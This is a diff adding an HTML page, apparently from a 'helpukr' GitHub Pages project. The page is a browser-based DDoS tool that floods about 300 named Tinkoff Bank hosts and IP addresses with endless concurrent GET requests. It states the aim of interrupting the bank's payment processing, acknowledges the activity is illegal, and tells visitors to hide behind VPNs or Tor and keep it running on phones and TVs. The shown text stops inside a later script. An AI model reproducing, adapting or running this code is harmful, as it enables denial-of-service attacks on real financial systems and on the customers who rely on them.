@@ -1,0 +1,721 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 233 flood</title>
+<link href="http://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="http://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "http://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("http://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="http://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 233</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you're likely already aware, the action of DoSing or participating in DDoS is illegal, and for good reason.
+Click on continue if you have a VPN Enabled, use a proxy, use the Tor browser or have your own secure connection and wish to support Ukraine in taking down Russian propaganda.</p>
+    <hr style=" margin-top: 5px; margin-bottom: 5px;">
+    <p>This works by sending GET requests to each targeted website.<br>
+       It’s like opening each website at once on your PC and<br>
+      re-requesting the data over and over, although the data is not saved or cached, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its best to stay safe.</p></div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='http://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="http://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">http://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 233 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="http://pages.github.com/" target="_blank" class="align-content-sm-between"><a href="http://pages.github.com/" target="_blank" class="style15">GitHub Page</a>, You can download it for local use and customization <a href="http://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day233.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> 
+                      open the developer console by pressing F12 and select the Network Tab.<br>
+                      If you're on a mac you can't use F12 for this, instead right click anywhere on the site and click inspect, then click the network tab</p>
+                    <p class="style11" style="margin-bottom: 0px;"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This happens because everything that happens is logged by the browser, but you can stop it pretty easily.<br>
+                      In the Network tab on the developer console (F12), press both the red button and the stop symbol.</p>
+                    <details style="margin-bottom: 16px;">
+                      <summary><span style="color: #ffff99;">Click Here to see Example</span></summary>
+                      <img src="http://i.imgur.com/5Cw6kai.png" draggable="false"> </details>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using http:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //Today we return to banks again. Tinkoff Bank in the sights. We aim to interrupt payment processing, delay liabilities, undermine bank’s reputation as usual.
+            'http://91.217.20.20:80',
+            'http://91.217.21.20:80',
+            'http://91.194.227.77:80',
+            'http://91.194.227.92:80',
+            'http://91.194.227.126:80',
+            'http://91.194.226.248:80',
+            'http://91.194.227.87:80',
+            'http://91.194.227.172:80',
+            'http://tinkoff-group.com:80',
+            'http://www.tinkoff-group.com:80',
+            'http://tcsbank.ru:80',
+            'http://supbo-test.tcsbank.ru:80',
+            'http://test.tcsbank.ru:80',
+            'http://gw-vpn05.tcsbank.ru:80',
+            'http://auth.tcsbank.ru:80',
+            'http://ds-asterisk09.tcsbank.ru:80',
+            'http://m1-freeswitch01.tcsbank.ru:80',
+            'http://m1-asterisk15.tcsbank.ru:80',
+            'http://sp.tcsbank.ru:80',
+            'http://sso-qa.tcsbank.ru:80',
+            'http://sso-uat.tcsbank.ru:80',
+            'http://vm-mcafee-ah05p.tcsbank.ru:80',
+            'http://m1-gate-gi0-1.tcsbank.ru:80',
+            'http://zp.tcsbank.ru:80',
+            'http://shpuntik.tcsbank.ru:80',
+            'http://sme-qa2.tcsbank.ru:80',
+            'http://qa-mapi.tcsbank.ru:80',
+            'http://ns.tcsbank.ru:80',
+            'http://mg-pg.tcsbank.ru:80',
+            'http://ftp-tracker.tcsbank.ru:80',
+            'http://ds-freeswitch01.tcsbank.ru:80',
+            'http://ds-gate-fa0-1-171.tcsbank.ru:80',
+            'http://ds-mx07.tcsbank.ru:80',
+            'http://ds-mx09.tcsbank.ru:80',
+            'http://business-qa.tcsbank.ru:80',
+            'http://ds-asterisk08.tcsbank.ru:80',
+            'http://mx2.tcsbank.ru:80',
+            'http://www-qa.tcsbank.ru:80',
+            'http://weboffice-qa.tcsbank.ru:80',
+            'http://freelance.tcsbank.ru:80',
+            'http://ib-qa.tcsbank.ru:80',
+            'http://mx4.tcsbank.ru:80',
+            'http://meowle.qa-fintech.tcsbank.ru:80',
+            'http://ds-asterisk01.tcsbank.ru:80',
+            'http://px-tracker.tcsbank.ru:80',
+            'http://prod.odt.tcsbank.ru:80',
+            'http://vintik.tcsbank.ru:80',
+            'http://ansnet-qa.tcsbank.ru:80',
+            'http://asia-northeast1.pfp.gke.tcsbank.ru:80',
+            'http://gw-vpn03.tcsbank.ru:80',
+            'http://m1-asterisk10.tcsbank.ru:80',
+            'http://lrp-a1.tcsbank.ru:80',
+            'http://mail05.tcsbank.ru:80',
+            'http://www-qa4.tcsbank.ru:80',
+            'http://d2.tcsbank.ru:80',
+            'http://ds-asterisk23.tcsbank.ru:80',
+            'http://ds-asterisk05.tcsbank.ru:80',
+            'http://mpi.tcsbank.ru:80',
+            'http://okapp.tcsbank.ru:80',
+            'http://tcrm-api-preprod-learn-wo.tcsbank.ru:80',
+            'http://vpn-gate1-outside.tcsbank.ru:80',
+            'http://m1-asterisk11.tcsbank.ru:80',
+            'http://magentbep.tcsbank.ru:80',
+            'http://m1-asterisk03.tcsbank.ru:80',
+            'http://ds-sipproxy-pre01.tcsbank.ru:80',
+            'http://ds.sage.tcsbank.ru:80',
+            'http://www.voltage-pp-0000.tcsbank.ru:80',
+            'http://gw-vpn.tcsbank.ru:80',
+            'http://dedpwa-pfpmvno.tcsbank.ru:80',
+            'http://dedpwa-pwadeposit.tcsbank.ru:80',
+            'http://tapi-qa.tcsbank.ru:80',
+            'http://oplata-beta.tcsbank.ru:80',
+            'http://m1-asterisk12.tcsbank.ru:80',
+            'http://m1-extmail01.tcsbank.ru:80',
+            'http://integration-qa.tcsbank.ru:80',
+            'http://kfp.tcsbank.ru:80',
+            'http://messenger-qa2.tcsbank.ru:80',
+            'http://zingaya.tcsbank.ru:80',
+            'http://pages.devplatform.tcsbank.ru:80',
+            'http://pfa.gke.tcsbank.ru:80',
+            'http://ns2.tcsbank.ru:80',
+            'http://agents.tcsbank.ru:80',
+            'http://allure.tcsbank.ru:80',
+            'http://testauth.tcsbank.ru:80',
+            'http://webim-qa.tcsbank.ru:80',
+            'http://wa-test.tcsbank.ru:80',
+            'http://m3.tcsbank.ru:80',
+            'http://dedpwa-pfposago.tcsbank.ru:80',
+            'http://pfp.gke.tcsbank.ru:80',
+            'http://ds-r2-ae0-171.tcsbank.ru:80',
+            'http://f5-hcc-test01.tcsbank.ru:80',
+            'http://kassa-beta.tcsbank.ru:80',
+            'http://mail07.tcsbank.ru:80',
+            'http://gw-vpn09.tcsbank.ru:80',
+            'http://hq-msk-var-app16.tcsbank.ru:80',
+            'http://agentreftest.tcsbank.ru:80',
+            'http://m1-sipproxy01.tcsbank.ru:80',
+            'http://m1-asterisk04.tcsbank.ru:80',
+            'http://vm-asterisk01t.tcsbank.ru:80',
+            'http://uat.tcsbank.ru:80',
+            'http://webfile.tcsbank.ru:80',
+            'http://weboffice.tcsbank.ru:80',
+            'http://vbv.tcsbank.ru:80',
+            'http://gw-vpn04.tcsbank.ru:80',
+            'http://ds-asterisk07.tcsbank.ru:80',
+            'http://sm-register-test.tcsbank.ru:80',
+            'http://adm-stage.tcsbank.ru:80',
+            'http://dedpwa-pfpsme.tcsbank.ru:80',
+            'http://m1-mx09.tcsbank.ru:80',
+            'http://acs.tcsbank.ru:80',
+            'http://securepay.tcsbank.ru:80',
+            'http://m1-asterisk14.tcsbank.ru:80',
+            'http://emmtest.tcsbank.ru:80',
+            'http://mail01.tcsbank.ru:80',
+            'http://wifi-gate.tcsbank.ru:80',
+            'http://logs.qa-fintech.tcsbank.ru:80',
+            'http://brokers.tcsbank.ru:80',
+            'http://qiwi-tcs-gate.tcsbank.ru:80',
+            'http://sme-qa.tcsbank.ru:80',
+            'http://hx.tcsbank.ru:80',
+            'http://voltage-pp-0000.tcsbank.ru:80',
+            'http://cfg-stage.tcsbank.ru:80',
+            'http://ds-asterisk06.tcsbank.ru:80',
+            'http://mx-ds.tcsbank.ru:80',
+            'http://gw-fw-stby.tcsbank.ru:80',
+            'http://cryptowalletapi-qa.tcsbank.ru:80',
+            'http://config-dev.tcsbank.ru:80',
+            'http://secure.tcsbank.ru:80',
+            'http://sf.tcsbank.ru:80',
+            'http://travel.tcsbank.ru:80',
+            'http://tapi-qa-stable.tcsbank.ru:80',
+            'http://safaripush-qa.tcsbank.ru:80',
+            'http://safaripush.tcsbank.ru:80',
+            'http://m1-asterisk01.tcsbank.ru:80',
+            'http://m1-asterisk17.tcsbank.ru:80',
+            'http://vm-asterisk04t.tcsbank.ru:80',
+            'http://vm-asterisk06t.tcsbank.ru:80',
+            'http://vm-asterisk02t.tcsbank.ru:80',
+            'http://m1.sage.tcsbank.ru:80',
+            'http://m1-mx06.tcsbank.ru:80',
+            'http://zingaya1.tcsbank.ru:80',
+            'http://m1-rtpproxy01.tcsbank.ru:80',
+            'http://scoring-qa.tcsbank.ru:80',
+            'http://odt.tcsbank.ru:80',
+            'http://certs-qa.tcsbank.ru:80',
+            'http://api-tracker.tcsbank.ru:80',
+            'http://loyalty-test.tcsbank.ru:80',
+            'http://img-tracker.tcsbank.ru:80',
+            'http://d3.tcsbank.ru:80',
+            'http://ftp11.tcsbank.ru:80',
+            'http://ds-r1-gi0-0.tcsbank.ru:80',
+            'http://data01.tcsbank.ru:80',
+            'http://f5-smtp-gate.tcsbank.ru:80',
+            'http://bus.tcsbank.ru:80',
+            'http://mx3.tcsbank.ru:80',
+            'http://ds-mx05.tcsbank.ru:80',
+            'http://m1-mail55.tcsbank.ru:80',
+            'http://m1-r2-ae0-171.tcsbank.ru:80',
+            'http://m1-asterisk18.tcsbank.ru:80',
+            'http://www-qa2.tcsbank.ru:80',
+            'http://www.preprod.tcsbank.ru:80',
+            'http://wifi-gate-stby.tcsbank.ru:80',
+            'http://vipnet-gate.tcsbank.ru:80',
+            'http://d4.tcsbank.ru:80',
+            'http://d1.tcsbank.ru:80',
+            'http://qa-fintech.tcsbank.ru:80',
+            'http://ds-asterisk-prt01.tcsbank.ru:80',
+            'http://sso-qa2.tcsbank.ru:80',
+            'http://messenger-qa3.tcsbank.ru:80',
+            'http://moneybot.tcsbank.ru:80',
+            'http://v2.tcsbank.ru:80',
+            'http://ds-asterisk12.tcsbank.ru:80',
+            'http://mx6.tcsbank.ru:80',
+            'http://weboffice2.tcsbank.ru:80',
+            'http://m1-mail10.tcsbank.ru:80',
+            'http://m1-asterisk21.tcsbank.ru:80',
+            'http://messenger-qa.tcsbank.ru:80',
+            'http://mobileapp2.tcsbank.ru:80',
+            'http://tracker-test.tcsbank.ru:80',
+            'http://sso-qa3.tcsbank.ru:80',
+            'http://agentref.tcsbank.ru:80',
+            'http://gw-r1.tcsbank.ru:80',
+            'http://gw-vpn06.tcsbank.ru:80',
+            'http://ds-sipgw01.tcsbank.ru:80',
+            'http://ds-sipproxy-prt01.tcsbank.ru:80',
+            'http://ds-sipproxy01.tcsbank.ru:80',
+            'http://ds-asterisk02.tcsbank.ru:80',
+            'http://ds-asterisk24.tcsbank.ru:80',
+            'http://m1-asterisk20.tcsbank.ru:80',
+            'http://tapi-qa-master.tcsbank.ru:80',
+            'http://rpti2.tcsbank.ru:80',
+            'http://tcb-qa2.tcsbank.ru:80',
+            'http://www.cfg-stage.tcsbank.ru:80',
+            'http://www.adm-stage.tcsbank.ru:80',
+            'http://m1.tcsbank.ru:80',
+            'http://ib.tcsbank.ru:80',
+            'http://ns7.tcsbank.ru:80',
+            'http://vm-aibot01t.tcsbank.ru:80',
+            'http://ds-asterisk11.tcsbank.ru:80',
+            'http://ssl-vpn.tcsbank.ru:80',
+            'http://ds-asterisk10.tcsbank.ru:80',
+            'http://magentbet.tcsbank.ru:80',
+            'http://m1-asterisk13.tcsbank.ru:80',
+            'http://m1-sipproxy-sme01.tcsbank.ru:80',
+            'http://qa-weboffice2.tcsbank.ru:80',
+            'http://secure2.tcsbank.ru:80',
+            'http://www.tcsbank.ru:80',
+            'http://target.tcsbank.ru:80',
+            'http://m1-mx07.tcsbank.ru:80',
+            'http://mx5.tcsbank.ru:80',
+            'http://ds-mx06.tcsbank.ru:80',
+            'http://www-qa3.tcsbank.ru:80',
+            'http://sso-dev.tcsbank.ru:80',
+            'http://pistat.tcsbank.ru:80',
+            'http://qv-test.tcsbank.ru:80',
+            'http://ds-asterisk14.tcsbank.ru:80',
+            'http://m1-asterisk02.tcsbank.ru:80',
+            'http://ds-rtpproxy01.tcsbank.ru:80',
+            'http://ds-sipproxy-sme01.tcsbank.ru:80',
+            'http://bpcbt-mobile.tcsbank.ru:80',
+            'http://m1-sipproxy-pre01.tcsbank.ru:80',
+            'http://m2.tcsbank.ru:80',
+            'http://forma.tcsbank.ru:80',
+            'http://artifactory-test.tcsbank.ru:80',
+            'http://m1-mx05.tcsbank.ru:80',
+            'http://mx-m1.tcsbank.ru:80',
+            'http://jira.qa-fintech.tcsbank.ru:80',
+            'http://mail03.tcsbank.ru:80',
+            'http://mc-ah.tcsbank.ru:80',
+            'http://mobileappdev.tcsbank.ru:80',
+            'http://evops-test.tcsbank.ru:80',
+            'http://d5.tcsbank.ru:80',
+            'http://bank2015.tcsbank.ru:80',
+            'http://data-test.tcsbank.ru:80',
+            'http://iacq-qa.tcsbank.ru:80',
+            'http://ib-dev.tcsbank.ru:80',
+            'http://m1-asterisk19.tcsbank.ru:80',
+            'http://ftp03.tcsbank.ru:80',
+            'http://qa2-acq-receipt.tcsbank.ru:80',
+            'http://moneybottest.tcsbank.ru:80',
+            'http://sdo.tcsbank.ru:80',
+            'http://ds-aio01p.tcsbank.ru:80',
+            'http://sage.tcsbank.ru:80',
+            'http://staging.allure.tcsbank.ru:80',
+            'http://m1-mx08.tcsbank.ru:80',
+            'http://jira2partners.tcsbank.ru:80',
+            'http://integration.tcsbank.ru:80',
+            'http://gw-vpn10.tcsbank.ru:80',
+            'http://vrf-wifi.tcsbank.ru:80',
+            'http://vpn-gate1-outside-stby.tcsbank.ru:80',
+            'http://iacq-dev.tcsbank.ru:80',
+            'http://m1-sipgw01.tcsbank.ru:80',
+            'http://m1-r1-gi0-0.tcsbank.ru:80',
+            'http://ns6.tcsbank.ru:80',
+            'http://smartsec-qa.tcsbank.ru:80',
+            'http://ds-asterisk04.tcsbank.ru:80',
+            'http://ds-masterchain01t.tcsbank.ru:80',
+            'http://acstest.tcsbank.ru:80',
+            'http://tcs-wifi.tcsbank.ru:80',
+            'http://static2-qa.tcsbank.ru:80',
+            'http://sp-dev.tcsbank.ru:80',
+            'http://vm-fintech01.tcsbank.ru:80',
+            'http://sber.tcsbank.ru:80',
+            'http://f5-fs-lb.tcsbank.ru:80',
+            'http://jamf.tcsbank.ru:80',
+            'http://dedpwa-pwaplatform.tcsbank.ru:80',
+            'http://vb.tcsbank.ru:80',
+            'http://bs.tcsbank.ru:80',
+            'http://static.tcsbank.ru:80',
+            'http://gw-vpn01.tcsbank.ru:80',
+            'http://gw-vpn07.tcsbank.ru:80',
+            'http://gw-vpn08.tcsbank.ru:80',
+            'http://mx1.tcsbank.ru:80',
+            'http://mail55.tcsbank.ru:80',
+            'http://mobileapptest.tcsbank.ru:80',
+            'http://moedelo-dev.tcsbank.ru:80',
+            'http://my.tcsbank.ru:80',
+            'http://vpn-gate-outside.tcsbank.ru:80',
+            'http://wifi-gate-outside.tcsbank.ru:80',
+            'http://wifi-gate-outside-stby.tcsbank.ru:80',
+            'http://rpti.tcsbank.ru:80',
+            'http://m4.tcsbank.ru:80',
+            'http://ds-asterisk25.tcsbank.ru:80',
+            'http://m1-asterisk05.tcsbank.ru:80',
+            'http://m1-asterisk16.tcsbank.ru:80',
+            'http://magentbedev.tcsbank.ru:80',
+            'http://pgadmin.qa-fintech.tcsbank.ru:80',
+            'http://ds-asterisk19.tcsbank.ru:80',
+            'http://business-qa2.tcsbank.ru:80',
+            'http://evops.tcsbank.ru:80',
+            'http://ds-rtpproxy-prt01.tcsbank.ru:80',
+            'http://m5.tcsbank.ru:80',
+            'http://mobileapp.tcsbank.ru:80',
+            'http://m1-r1-gi0-1-551.tcsbank.ru:80',
+            'http://m1-asterisk-prt01.tcsbank.ru:80',
+            'http://of-r1-gi0-0-171.tcsbank.ru:80',
+            'http://ws2.tcsbank.ru:80',
+            'http://ftp02.tcsbank.ru:80',
+            'http://mbi.tcsbank.ru:80',
+            'http://mail54.tcsbank.ru:80',
+            'http://prtmail01.tcsbank.ru:80',
+            'http://testsbl.tcsbank.ru:80',
+            'http://sme-qa3.tcsbank.ru:80',
+            'http://sp-qa.tcsbank.ru:80',
+            'http://www-uat.tcsbank.ru:80',
+            'http://vpn-ha.tcsbank.ru:80',
+            'http://m1-sip.tcsbank.ru:80',
+            'http://asia-southeast1.pfp.gke.tcsbank.ru:80',
+            'http://dedpwa-pfphome.tcsbank.ru:80',
+            'http://hatest.tcsbank.ru:80',
+            'http://business-qa3.tcsbank.ru:80',
+            'http://apagparty-test.tcsbank.ru:80',
+            'http://ftp06.tcsbank.ru:80',
+            'http://api.tcsbank.ru:80',
+            'http://gw-vpn2.tcsbank.ru:80',
+            'http://integration-test.tcsbank.ru:80',
+            'http://rest-api-test.tcsbank.ru:80',
+            'http://qa-weboffice.tcsbank.ru:80',
+            'http://testpay.tcsbank.ru:80',
+            'http://topicsegmentation.tcsbank.ru:80',
+            'http://ds-extmail01.tcsbank.ru:80',
+            'http://ds-asterisk03.tcsbank.ru:80',
+            'http://tcs-guest.tcsbank.ru:80',
+            'http://pay.tcsbank.ru:80',
+            'http://ws1.tcsbank.ru:80',
+            'http://d9-1.tcsbank.ru:80',
+            'http://artifactory.tcsbank.ru:80',
+            'http://dedpwa-pfpkasko.tcsbank.ru:80',
+            'http://dedpwa-pwacredit.tcsbank.ru:80',
+            'http://ds-mx08.tcsbank.ru:80',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h4>${urls[i]}</h4>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
